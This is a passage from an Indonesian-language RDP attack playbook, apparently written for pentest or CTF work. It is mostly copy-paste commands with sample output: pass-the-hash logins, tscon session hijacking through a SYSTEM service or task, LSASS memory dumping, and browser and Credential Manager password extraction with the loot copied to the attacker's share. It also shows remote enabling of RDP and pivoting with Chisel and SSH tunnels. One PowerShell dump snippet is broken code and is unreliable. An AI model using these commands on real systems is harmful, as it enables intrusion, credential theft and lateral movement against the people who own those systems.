whoami /all
whoami /priv

# 2. Cek sesi aktif (ada user lain yang login?)
query session
qwinsta

# 3. Cek OS dan patch level
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"
wmic qfe list brief /format:table | head

# 4. Cek network interfaces (pivot ke network lain?)
ipconfig /all
arp -a
route print

# 5. Cari file menarik di Desktop dan common locations
dir C:\Users\$USER\Desktop\
dir C:\Users\$USER\Downloads\
dir C:\Users\$USER\Documents\
```

**OUTPUT BERHASIL ✅ — Sesi aktif user lain ditemukan:**

text

```
 SESSIONNAME      USERNAME         ID  STATE   TYPE        DEVICE
 services                           0  Disc
 console                            1  Conn
>rdp-tcp#0        j.smith           2  Active
 rdp-tcp#4        Administrator     5  Active    ← TARGET SESSION HIJACKING!
```

➡️ Ada Administrator aktif! Lanjut ke **FASE 5 — Session Hijacking**.

**OUTPUT BERHASIL ✅ — File .rdp ditemukan:**

text

```
C:\Users\operator\Desktop\connection_to_dc.rdp
```

➡️ File .rdp mungkin simpan credentials! Baca isinya:

PowerShell

```
# Di dalam RDP session
type C:\Users\operator\Desktop\connection_to_dc.rdp

# Jika ada field "password 51:b:" → decrypt dengan DPAPI
$EncryptedBlob = "01000000D08C9DDF..."
$Bytes = for ($i = 0; $i -lt $EncryptedBlob.Length; $i += 2) { 
    [Convert]::ToByte($EncryptedBlob.Substring($i, 2), 16) 
}
[System.Text.Encoding]::Unicode.GetString(
    [System.Security.Cryptography.ProtectedData]::Unprotect($Bytes, $null, 'CurrentUser')
)
# Output: plaintext password!
```

---

## ═══════════════════════════════════════

## FASE 4: PASS-THE-HASH (PtH) VIA RDP

## ═══════════════════════════════════════

> **Masuk sini jika:** Punya NTLM hash dari SMB/secretsdump tapi belum bisa crack jadi plaintext.

### Langkah 4.1 — Verifikasi Restricted Admin Mode

Bash

```
# Cek registry DisableRestrictedAdmin
# 0 = Restricted Admin AKTIF (PtH BISA!)
# 1 atau key tidak ada = Restricted Admin MATI (PtH GAGAL)

# Method 1: Via NetExec SMB dengan hash
nxc smb $TARGET -u "$USER" -H "$HASH" \
    -x "reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin"

# Method 2: Via WinRM jika available
nxc winrm $TARGET -u "$USER" -H "$HASH" \
    -x "reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin"
```

**OUTPUT BERHASIL ✅ — Restricted Admin AKTIF:**

text

```
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
    DisableRestrictedAdmin    REG_DWORD    0x0    ← 0 = AKTIF, PtH BISA!
```

➡️ Lanjut ke Langkah 4.2.

**OUTPUT BERHASIL ✅ — Key tidak ditemukan (mungkin masih aktif):**

text

```
ERROR: The system was unable to find the specified registry key or value.
```

➡️ Key tidak ada = default behavior = Restricted Admin mungkin aktif. Coba PtH langsung.

**OUTPUT GAGAL ❌ — Restricted Admin DINONAKTIFKAN:**

text

```
DisableRestrictedAdmin    REG_DWORD    0x1    ← 1 = MATI, PtH GAGAL!
```

➡️ Aktifkan dulu jika punya admin shell:

Bash

```
# Aktifkan Restricted Admin Mode
nxc smb $TARGET -u "$USER" -H "$HASH" \
    -x "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"

# Verifikasi berhasil
nxc smb $TARGET -u "$USER" -H "$HASH" \
    -x "reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin"
```

---

### Langkah 4.2 — Login GUI RDP dengan NTLM Hash

Bash

```
# NTLM hash format: LM:NT atau hanya NT hash
# Contoh: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Command 1: xfreerdp dengan /pth flag (FreeRDP2/FreeRDP3)
xfreerdp /v:$TARGET \
    /u:"$USER" \
    /pth:$HASH \
    /cert:ignore \
    +clipboard \
    /restricted-admin \
    /dynamic-resolution

# Command 2: Jika /restricted-admin tidak dikenal di versi lama
xfreerdp /v:$TARGET \
    /u:"$USER" \
    /pth:$HASH \
    /cert:ignore \
    +clipboard \
    /sec:nla

# Command 3: Validasi via NetExec sebelum GUI
nxc rdp $TARGET -u "$USER" -H "$HASH"
```

**OUTPUT BERHASIL ✅ — Desktop terbuka tanpa crack password:**

text

```
[INFO] Authentication successful
# → Jendela Windows Desktop Administrator terbuka!
```

**OUTPUT GAGAL ❌ — Logon failure: the user has not been granted the requested logon type:**

text

```
[ERROR] Logon failure: the user has not been granted the requested logon type
```

➡️ Restricted Admin Mode belum aktif atau hash salah. Cek dan aktifkan dulu (Langkah 4.1).

**OUTPUT GAGAL ❌ — Account restrictions are preventing this user from signing in:**

text

```
[ERROR] Account restrictions are preventing this user from signing in
```

➡️ User mungkin disable atau ada policy yang blokir remote login:

Bash

```
# Cek status akun
nxc smb $TARGET -u "$USER" -H "$HASH" -x "net user $USER"

# Cek Remote Desktop policy
nxc smb $TARGET -u "$USER" -H "$HASH" \
    -x 'reg query "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections'
```

---

## ═══════════════════════════════════════

## FASE 5: RDP SESSION HIJACKING (TANPA PASSWORD!)

## ═══════════════════════════════════════

> **Masuk sini jika:** Sudah punya shell di target dan `query session` menunjukkan ada user lain yang aktif/disconnected.  
> **Konsep:** Gunakan `tscon.exe` sebagai SYSTEM untuk ambil alih sesi user lain tanpa perlu password mereka.

### Langkah 5.1 — Identifikasi Sesi Aktif

Bash

```
# Di dalam shell target (CMD/PowerShell/WinRM)
query session
# atau
qwinsta
```

**OUTPUT BERHASIL ✅:**

text

```
 SESSIONNAME      USERNAME         ID  STATE   TYPE        DEVICE
 services                           0  Disc
 console                            1  Conn
>rdp-tcp#0        lowpriv_user      2  Active   ← KAMU DI SINI (ID 2)
 rdp-tcp#5        Administrator     3  Active   ← TARGET HIJACKING (ID 3)
 rdp-tcp#7        backup_admin      4  Disc     ← DISCONNECTED (juga bisa dibajak!)
```

➡️ Catat:

- ID sesi kamu sendiri (yang ada tanda `>`)
- ID sesi target (Administrator di ID 3)
- Nama sesi tujuan kamu (`rdp-tcp#0`)

---

### Langkah 5.2 — Hijacking Berdasarkan Privilege Level

**SITUASI 1: Kamu sudah SYSTEM**

cmd

```
# Langsung jalankan tscon — tidak butuh password!
tscon 3 /dest:rdp-tcp#0

# Atau bajak sesi disconnected
tscon 4 /dest:rdp-tcp#0
```

**OUTPUT BERHASIL ✅:**

text

```
# Jendela RDP langsung berubah menjadi desktop Administrator!
# Tidak ada prompt password sama sekali.
```

**SITUASI 2: Kamu adalah Local Administrator (bukan SYSTEM)**

➡️ Buat service yang berjalan sebagai SYSTEM:

cmd

```
# Method A: Windows Service (PALING MUDAH DAN CEPAT)
sc create HijackSession binpath= "cmd.exe /k tscon 3 /dest:rdp-tcp#0"
net start HijackSession
sc delete HijackSession

# Method B: Task Scheduler (lebih bersih)
schtasks /create /tn "RdpHijack" /tr "tscon 3 /dest:rdp-tcp#0" /sc once /st 00:00 /ru "SYSTEM"
schtasks /run /tn "RdpHijack"
schtasks /delete /tn "RdpHijack" /f
```

**OUTPUT BERHASIL ✅:**

text

```
The command completed successfully.
# Detik berikutnya: Desktop berubah menjadi sesi Administrator!
```

**SITUASI 3: Kamu adalah User Biasa (low-privilege)**

➡️ tscon akan fail — butuh privesc dulu:

text

```
Access is denied.
```

➡️ Lakukan privilege escalation → ke **<a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>**, kemudian kembali ke sini.

---

### Langkah 5.3 — Alternasi: Disconnect + Reconnect Sesi

cmd

```
# Jika tidak bisa bajak langsung, coba disconnect sesi target lalu reconnect
# (hanya bisa jika tidak ada autentikasi ulang)

# Lihat sesi disconnected
query session | findstr "Disc"

# Reconnect ke sesi disconnected dengan xfreerdp
# (dari Parrot OS, sambungkan ke sesi yang sudah ada)
xfreerdp /v:$TARGET /u:Administrator /p:"$PASS" /cert:ignore +clipboard
# Windows akan reconnect ke sesi existing Administrator
```

---

## ═══════════════════════════════════════

## FASE 6: POST-EXPLOITATION VIA RDP

## ═══════════════════════════════════════

> **Masuk sini jika:** Sudah berhasil masuk desktop RDP. Kumpulkan credentials dan informasi untuk lateral movement.

### Langkah 6.1 — Dump LSASS Memory (Credentials di Memori)

Bash

```
# METHOD 1: Via Task Manager GUI (paling mudah, tidak perlu tools)
# 1. Klik kanan Desktop → Task Manager
# 2. Tab Details → Cari lsass.exe
# 3. Klik kanan → "Create dump file"
# 4. File dump tersimpan di: C:\Users\<USER>\AppData\Local\Temp\lsass.DMP

# METHOD 2: Via PowerShell (lebih stealthy)
# Di dalam PowerShell di Windows target:
$lsass = Get-Process lsass
[System.IO.File]::WriteAllBytes("C:\Windows\Temp\lsass.dmp", (
    [System.Runtime.InteropServices.Marshal]::ReadIntPtr([System.Diagnostics.Process]::GetCurrentProcess().Handle)
))

# METHOD 3: Via ProcDump (jika bisa upload tool)
# Upload procdump.exe via /drive:loot yang sudah di-mount di FASE 3
# Di Windows target:
C:\Users\Public\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

# METHOD 4: Via comsvcs.dll (tidak perlu upload tool!)
# Di PowerShell Windows target (butuh SYSTEM privilege):
$pid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full

# Transfer dump ke Parrot OS via shared drive
# (file otomatis tersedia di /home/parrot/rdp_loot/files/ karena /drive:loot sudah di-mount)
cp C:\Windows\Temp\lsass.dmp "\\tsclient\loot\"
```

**Di Parrot OS — Parse dump dengan pypykatz:**

Bash

```
# Install pypykatz
pip3 install pypykatz

# Parse dump
pypykatz lsa minidump ~/rdp_loot/files/lsass.dmp \
    | tee ~/rdp_loot/creds/lsass_parsed.txt

# Cari credentials
grep -E "(username|password|NT:|domain)" ~/rdp_loot/creds/lsass_parsed.txt | head -50
```

**OUTPUT BERHASIL ✅:**

text

```
username Administrator
domain CORP
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
password: P@ssw0rd2024!

username svc_backup
domain CORP
NT: ab45c982b71a3d6e9f2c3d4e5f6a7b8c
```

➡️ Simpan semua credentials:

Bash

```
echo "Administrator:P@ssw0rd2024!" >> ~/rdp_loot/creds/found_creds.txt
echo "Administrator:31d6cfe0d16ae931b73c59d7e0c089c0" >> ~/rdp_loot/creds/ntlm_hashes.txt
```

---

### Langkah 6.2 — Browser Password Extraction

PowerShell

```
# Di dalam sesi RDP (PowerShell)

# Chrome saved passwords location:
# C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data

# Edge saved passwords:
# C:\Users\<USER>\AppData\Local\Microsoft\Edge\User Data\Default\Login Data

# Cara cepat via SharpChrome atau HackBrowserData (upload via drive share)
# Copy HackBrowserData.exe ke Windows via shared drive
C:\Users\Public\HackBrowserData.exe -browser all -format json -output C:\Windows\Temp\browser_data
# Transfer hasilnya ke Parrot OS
copy C:\Windows\Temp\browser_data.json "\\tsclient\loot\"
```

---

### Langkah 6.3 — Cek Saved Windows Credentials (Credential Manager)

cmd

```
# Di CMD Windows target
cmdkey /list
# Menampilkan semua saved credentials

# Ekstraksi dengan mimikatz (upload via drive share)
mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "vault::cred /patch" "exit"

# Atau via PowerShell tanpa mimikatz
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]::new().RetrieveAll() | % { $_.RetrievePassword(); $_ }
```

**OUTPUT BERHASIL ✅:**

text

```
Currently stored credentials:

    Target: Domain:target=10.10.11.150
    Type: Domain Password
    User: CORP\administrator
    Credential: AdminP@ss2024!
```

➡️ Simpan dan test ke semua service:

Bash

```
export USER="administrator"
export PASS="AdminP@ss2024!"
echo "$USER:$PASS" >> ~/rdp_loot/creds/found_creds.txt

# Test ke service lain
nxc smb $TARGET -u "$USER" -p "$PASS"
nxc winrm $TARGET -u "$USER" -p "$PASS"
```

---

### Langkah 6.4 — Network Discovery untuk Lateral Movement

PowerShell

```
# Di dalam RDP session (PowerShell)

# Cek network interfaces (ada subnet internal?)
ipconfig /all

# ARP cache (host apa yang pernah berkomunikasi?)
arp -a

# Cek routes (ada network lain yang bisa diakses?)
route print

# Cari host dengan RDP aktif di network internal
1..254 | ForEach-Object {
    $ip = "192.168.10.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $connection = $tcp.BeginConnect($ip, 3389, $null, $null)
        if ($connection.AsyncWaitHandle.WaitOne(100)) { Write-Host "RDP Open: $ip" }
        $tcp.Close()
    }
}
```

**OUTPUT BERHASIL ✅ — Network internal ditemukan:**

text

```
IPv4 Address: 10.10.11.200
Subnet Mask: 255.255.255.0
Default Gateway: 10.10.11.1

Ethernet adapter Internal:
IPv4 Address: 192.168.10.5    ← INTERNAL NETWORK!
```

➡️ Ada jaringan internal! Setup pivot:

Bash

```
# Dari Parrot OS — setup SSH tunnel via target (jika SSH available)
ssh -L 33389:192.168.10.50:3389 $USER@$TARGET -N -f

# Koneksi ke RDP internal melalui tunnel
xfreerdp /v:127.0.0.1:33389 /u:"$USER" /p:"$PASS" /cert:ignore +clipboard
```

---

## ═══════════════════════════════════════

## FASE 7: ENABLING RDP REMOTELY (Jika Port Tertutup)

## ═══════════════════════════════════════

> **Masuk sini jika:** Port 3389 tertutup/filtered tapi sudah punya shell (WinRM/SMB/web shell).

### Langkah 7.1 — Aktifkan RDP dari Shell

Bash

```
# Via NetExec (paling mudah jika punya creds admin)
nxc smb $TARGET -u "$USER" -p "$PASS" -x 'powershell.exe -c "Set-ItemProperty -Path \"HKLM:\System\CurrentControlSet\Control\Terminal Server\" -name \"fDenyTSConnections\" -Value 0; Enable-NetFirewallRule -DisplayGroup \"Remote Desktop\""'

# Via WinRM
nxc winrm $TARGET -u "$USER" -p "$PASS" -x 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -name "fDenyTSConnections" -Value 0'

# Via PowerShell di target langsung
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
    -name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Get-Service -Name TermService | Start-Service

# Aktifkan Restricted Admin Mode sekaligus (untuk PtH)
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

**OUTPUT BERHASIL ✅:**

text

```
The command completed successfully.
# Verifikasi:
nxc rdp $TARGET
RDP   10.10.11.200  3389  FILE01  [*] Windows Server 2019 (name:FILE01) (nla:True)
```

➡️ RDP sekarang aktif! Kembali ke **FASE 1** untuk connect.

---

### Langkah 7.2 — Pivot via SSH Tunnel + ProxyChains

Bash

```
# Jika RDP internal hanya accessible dari dalam network target
# dan kamu sudah punya SSH access ke host perantara

# Method 1: SSH Local Port Forwarding
ssh -L 33389:192.168.10.50:3389 user@$TARGET -N -f

# Koneksi via tunnel
xfreerdp /v:127.0.0.1:33389 /u:"$USER" /p:"$PASS" /cert:ignore +clipboard

# Method 2: ProxyChains + SOCKS5 (via Chisel atau SSH -D)
# Setup Chisel server di Parrot OS
./chisel server -p 8888 --reverse

# Di target (upload chisel.exe via drive share atau HTTP):
chisel.exe client $LHOST:8888 R:socks

# Koneksi via ProxyChains
proxychains4 xfreerdp /v:192.168.10.50 /u:"$USER" /p:"$PASS" /cert:ignore +clipboard
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`Certificate verification failed`|TLS self-signed cert|Tambah `/cert:ignore`|
|`CredSSP Encryption Oracle`|CVE-2018-0886 mismatch|Coba `/sec:tls` atau `/sec:rdp`|
|`Authentication failure, NLA requires credentials`|Credentials salah/format domain|Coba `/u:"user@domain.local"`|
|`Could not connect to IP:3389`|Port filtered/closed|Scan port alternatif 3388,3390|
|`Jendela tertutup/crash`|Grafis X11 conflict|Tambah `/size:1280x720 /gdi:sw`|
|`Keyboard karakter berbeda`|Layout keyboard mismatch|Tambah `/kbd:0x00000409`|
|`Copy-paste tidak bekerja`|rdpclip.exe hang|Kill rdpclip.exe di Task Manager target, restart|
|`Resolusi terlalu kecil`|Server tidak support dynamic resize|Gunakan `/size:1600x900`|
|`Sesi RDP terputus otomatis`|GPO idle timeout|Biarkan proses background berjalan|
|`PtH gagal: logon failure`|Restricted Admin Mode mati|`reg add ... DisableRestrictedAdmin /d 0`|
|`tscon: Access Denied`|Bukan SYSTEM privilege|Buat service atau scheduled task sebagai SYSTEM|
|`BlueKeep: no session created`|Wrong kernel offset / BSOD|Coba target type lain di MSF, atau gunakan credentials|
|`STATUS_ACCOUNT_LOCKED_OUT`|Terlalu banyak attempt|STOP! Tunggu lockout duration, spray hati-hati|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Port 3389 Open
│
├─ FASE 0: Fingerprint (nxc rdp + nmap)
│   ├─ NLA: False → Cek BlueKeep (Windows 7/2008 R2)
│   └─ NLA: True  → Butuh credentials
│
├─ FASE 1: Credential Testing
│   ├─ [Credentials dari LDAP/SMB] → Test nxc rdp
│   ├─ [NTLM Hash]                → Test PtH (cek Restricted Admin)
│   ├─ [Belum punya]              → Password Spraying (hati-hati lockout!)
│   └─ [(Pwn3d!)]                 → Admin! Langsung FASE 3 + FASE 4
│
├─ FASE 2: Vulnerability Scan
│   ├─ [Windows 7/2008 R2 + NLA:False] → BlueKeep → SYSTEM shell
│   ├─ [MS12-020]                       → DoS (dokumentasi saja)
│   └─ [Not vulnerable]                → Kembali ke credential attack
│
├─ FASE 3: RDP GUI Access (xfreerdp)
│   ├─ [Standard creds] → xfreerdp /v /u /p /cert:ignore
│   ├─ [NTLM hash]      → xfreerdp /pth /restricted-admin
│   └─ [Masuk desktop]  → FASE 6 (Post-exploitation)
│
├─ FASE 4: Pass-The-Hash
│   ├─ [Restricted Admin = 0] → xfreerdp /pth → Admin desktop
│   └─ [Restricted Admin = 1] → Aktifkan dulu via shell, retry
│
├─ FASE 5: Session Hijacking
│   ├─ [SYSTEM]          → tscon <ID> /dest → Admin desktop instant
│   ├─ [Local Admin]     → sc create service → tscon via SYSTEM
│   └─ [Low-priv user]   → Privesc dulu → ke 45_windows_privesc
│
├─ FASE 6: Post-Exploitation
│   ├─ [Dump LSASS]      → pypykatz → More credentials
│   ├─ [Browser creds]   → HackBrowserData → Portal passwords
│   ├─ [Network enum]    → Find internal hosts → Lateral movement
│   └─ [.rdp file]       → DPAPI decrypt → Plaintext password
│
└─ FASE 7: Enable RDP (jika port tertutup tapi punya shell)
    └─ nxc/WinRM → Set registry → Enable firewall → Connect RDP
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"
export USER="administrator"; export PASS="Password123!"
export DOMAIN="corp.local"
export HASH="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
mkdir -p ~/rdp_loot/{screenshots,creds,files,lsass}

# === FINGERPRINT & DETECTION ===
nxc rdp $TARGET                                              # NLA status + OS info
nmap -p 3389 --script rdp-ntlm-info,rdp-enum-encryption $TARGET  # Detail fingerprint
nxc rdp $TARGET --screenshot                                 # Pre-auth screenshot

# === CREDENTIAL TESTING ===
nxc rdp $TARGET -u "$USER" -p "$PASS" -d "$DOMAIN"         # Single cred test
nxc rdp $TARGET -u users.txt -p "$PASS" --continue-on-success  # Spray
nxc rdp $TARGET -u "$USER" -H "$HASH"                       # PtH test

# === GUI CONNECTION ===
xfreerdp /v:$TARGET /u:"$USER" /p:"$PASS" /d:"$DOMAIN" /cert:ignore /dynamic-resolution +clipboard
xfreerdp /v:$TARGET /u:"$USER" /p:"$PASS" /cert:ignore /dynamic-resolution +clipboard /drive:loot,/home/parrot/rdp_loot/files
xfreerdp /v:$TARGET /u:"$USER" /p:"$PASS" /cert:ignore /size:1280x720 /gdi:sw  # Crash fix
xfreerdp /v:$TARGET /u:"$USER" /pth:$HASH /cert:ignore +clipboard /restricted-admin  # PtH

# === VULNERABILITY CHECK ===
msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS $TARGET; set VERBOSE false; run; exit"
nmap -p 3389 --script rdp-vuln-ms12-020 $TARGET

# === SESSION HIJACKING ===
query session                                                # List sessions
sc create HijackSvc binpath= "cmd.exe /k tscon <ID> /dest:<SESSION>"
net start HijackSvc && sc delete HijackSvc

# === ENABLE RDP REMOTELY ===
nxc smb $TARGET -u "$USER" -p "$PASS" -x 'powershell -c "Set-ItemProperty -Path \"HKLM:\System\CurrentControlSet\Control\Terminal Server\" -name \"fDenyTSConnections\" -Value 0; Enable-NetFirewallRule -DisplayGroup \"Remote Desktop\""'
nxc smb $TARGET -u "$USER" -p "$PASS" -x "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"

# === POST-EXPLOITATION ===
# Di Windows target (PowerShell):
# Dump LSASS via comsvcs (tanpa upload tool):
$pid=(Get-Process lsass).Id; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\l.dmp full
# Parse di Parrot OS:
pypykatz lsa minidump ~/rdp_loot/files/l.dmp | tee ~/rdp_loot/creds/parsed.txt

# === PIVOT VIA TUNNEL ===
ssh -L 33389:192.168.10.50:3389 $USER@$TARGET -N -f
xfreerdp /v:127.0.0.1:33389 /u:"$USER" /p:"$PASS" /cert:ignore +clipboard
proxychains4 xfreerdp /v:192.168.10.50 /u:"$USER" /p:"$PASS" /cert:ignore +clipboard
```

### Cross-Service dari RDP:

text

```
RDP Creds / Shell Found
     │
     ├──→ LSASS dump    → pypykatz → More NTLM hashes
     ├──→ NTLM hashes   → PTH ke SMB/WinRM/LDAP
     ├──→ Browser creds → Portal/admin panel access
     ├──→ Network enum  → Internal subnet pivot → <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>
     ├──→ AD environment → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
     └──→ Session hijack → Admin desktop → <a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>
```

---

> **➡️ NEXT:** Setelah RDP selesai, lanjut ke **[13. NFS Exploitation & Network File System Workflow — Master Field Guide](/docs/nfs)** untuk Network File System — eksploitasi `no_root_squash`, UID spoofing, dan root shell langsung dari mount NFS. Atau jika sudah dapat credentials Domain Admin → langsung ke **`<a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>`** untuk full AD takeover.
